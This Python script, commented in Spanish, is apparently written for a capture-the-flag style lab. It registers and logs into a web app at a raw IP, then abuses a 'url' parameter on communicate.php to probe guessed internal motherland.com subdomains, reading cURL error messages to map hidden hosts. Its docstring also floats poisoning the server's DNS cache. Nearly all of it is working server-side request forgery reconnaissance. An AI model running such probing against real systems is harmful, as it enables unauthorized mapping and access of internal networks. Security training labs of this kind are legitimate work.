#!/usr/bin/env python3
"""
Nuevo ángulo: ¿Qué pasa si hay un servicio interno que actúa como proxy DNS?
O si puedo forzar al servidor a cachear una resolución DNS maliciosa?
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Intentar con subdominios que PODRÍAN estar configurados internamente
internal_domains = [
    "http://internal.motherland.com/",
    "http://local.motherland.com/",
    "http://dev.motherland.com/",
    "http://test.motherland.com/",
    "http://staging.motherland.com/",
    "http://prod.motherland.com/",
    "http://app.motherland.com/",
    "http://api.motherland.com/",
    "http://admin.motherland.com/",
    "http://backend.motherland.com/",
]

print("[*] Probando subdominios internos potenciales...")
for domain in internal_domains:
    data_req = {
        'url': domain,
        'data[action]': 'edit',
        'data[new_name]': 'TEST'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        
        if "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                if "timed out" not in error.lower():
                    print(f"[!] {domain}")
                    print(f"    Error diferente: {error[:80]}")
    except Exception as e:
        pass

print("\n[*] Continuando con más pruebas...")
